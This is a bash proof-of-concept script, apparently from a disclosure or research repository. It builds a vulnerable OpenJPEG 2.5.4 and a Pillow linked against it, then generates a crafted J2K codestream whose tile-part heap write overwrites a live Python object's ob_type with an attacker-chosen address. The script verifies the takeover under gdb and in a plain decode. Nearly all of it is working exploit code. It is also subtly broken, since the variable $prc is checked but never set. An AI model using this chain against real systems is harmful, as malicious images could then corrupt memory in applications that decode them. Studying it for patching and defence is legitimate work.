#!/usr/bin/env bash
# Silent ob_type takeover on a live Python object through the pinned TLM/SOT sink.
# Local process only; sources are the committed pins. Builds its own -g -O0
# libopenjp2 so gdb can break at j2k.c:5085; the codestream derives from the
# committed 202-byte public PoC. Usage: bash otype-takeover.sh OUTDIR [HEXADDR]
set -u

HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$(mkdir -p "$1" && cd "$1" && pwd)
ADDR=${2:-0xa3bf20}                 # &PyLong_Type in pinned non-PIE CPython 3.12.3
WANT=$((ADDR))
# evil=48: tile1 SOD = final SOD - 47*14; WRITE40 = tile1 SOD + 2.
TARGET=$((WANT + 47*14 - 2))

VLSRC="$OUT/src/openjpeg-2.5.4"
mkdir -p "$OUT/src"
tar -xzf "$HERE/src/openjpeg-2.5.4.tar.gz" -C "$OUT/src"
cmake -S "$VLSRC" -B "$OUT/dbg-build" -DBUILD_SHARED_LIBS=ON -DBUILD_CODEC=OFF \
  -DBUILD_TESTING=OFF -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="-g -O0 -fno-omit-frame-pointer" \
  -DCMAKE_INSTALL_PREFIX="$OUT/dbg-install" > "$OUT/cmake.log" 2>&1
cmake --build "$OUT/dbg-build" -j4 > "$OUT/build.log" 2>&1
cmake --install "$OUT/dbg-build" > "$OUT/install.log" 2>&1
[ -f "$OUT/dbg-install/lib/libopenjp2.so.7" ] || { echo "FAIL debug lib build"; exit 1; }

# Pillow built against the pinned vulnerable lib, from the committed recipe.
PILROOT="$OUT/pw-vuln"
if [ ! -d "$PILROOT/PIL" ]; then
  bash "$HERE/pillow-consumer.sh" "$OUT/pc" > /dev/null 2>&1
  [ -d "$OUT/pc/pw-vuln/PIL" ] || { echo "FAIL pillow build"; exit 1; }
  PILROOT="$OUT/pc/pw-vuln"
fi

python3 "$HERE/make-large-tpsot.py" "$HERE/src/poc.j2k" "$OUT/otype.j2k" \
  "$TARGET" 48 > "$OUT/gen.log" 2>&1
MEDIA=$(LD_LIBRARY_PATH="$OUT/dbg-install/lib" PILROOT="$PILROOT" \
  gdb -q -batch -x "$HERE/otype-takeover.gdb" --args \
  python3 "$HERE/pillow-probe.py" "$OUT/otype.j2k" 2>&1)
printf '%s\n' "$MEDIA" > "$OUT/gdb.log"

n=0
pass() { n=$((n+1)); echo "PASS $n $1"; }
fail() { echo "FAIL $1"; exit 1; }

# Any gdb-resolved static CPython type is acceptable: the concrete object at
# this heap slot differs between builds (PyCodeObject or PyUnicodeObject).
TYPES=$(printf '%s\n' "$MEDIA" | grep '^PYTYPE ' | grep -oE '0x[0-9a-f]+' | tr '\n' ' ')
[ -n "$TYPES" ] || fail "gdb did not resolve any static CPython type"
BEFORE=$(printf '%s\n' "$MEDIA" | sed -n 's/^HIT1 .*BEFORE40=\([0-9a-f]*\).*/\1/p')
WRITE=$(printf '%s\n' "$MEDIA" | sed -n 's/^HIT1 .*WRITE40=\([0-9a-f]*\).*/\1/p')
AFTER=$(printf '%s\n' "$MEDIA" | sed -n 's/.*POST40=\([0-9a-f]*\).*/\1/p')
[ -n "$AFTER" ] || fail "no post-store observation"
BEFORE_HEX=$(printf '0x%x' $((16#$BEFORE)))
case " $TYPES " in *" $BEFORE_HEX "*) ;; *) fail "destination was not a live Python object ob_type (before=$BEFORE_HEX types=$TYPES)" ;; esac
pass "TPsot=1 destination held a live Python object ob_type"
WRITE_HEX=$(printf '0x%x' $((16#$WRITE)))
AFTER_HEX=$(printf '0x%x' $((16#$AFTER)))
[ "$WRITE_HEX" = "$(printf '0x%x' "$WANT")" ] || fail "chosen value not written (got $WRITE_HEX)"
pass "sink writes the chosen static address into ob_type"
[ "$AFTER_HEX" = "$(printf '0x%x' "$WANT")" ] || fail "chosen value did not persist (got $AFTER_HEX)"
pass "chosen ob_type persists after the store"

# Unsanitized plain run: silent type confusion, no abort.
LD_LIBRARY_PATH="$OUT/dbg-install/lib" PILROOT="$PILROOT" \
  python3 "$HERE/pillow-probe.py" "$OUT/otype.j2k" > "$OUT/plain.log" 2>&1
if [ "$prc" = 0 ] && grep -q '^LOAD_OK$' "$OUT/plain.log"; then
  pass "plain consumer decodes with the corrupted type (rc 0, LOAD_OK)"
elif [ "$prc" = 134 ] && grep -q 'corrupted size vs. prev_size' "$OUT/plain.log"; then
  pass "plain consumer aborts on adjacent allocator metadata (rc 134)"
else
  fail "unexpected plain run rc=$prc"
fi

echo "RESULT $n PASS / 0 FAIL"
printf '%s\n' "$MEDIA" | grep -E '^(HIT0|HIT1|POST32|POST40|PYTYPE)' > "$OUT/trace.txt"
sha256sum "$OUT/trace.txt"
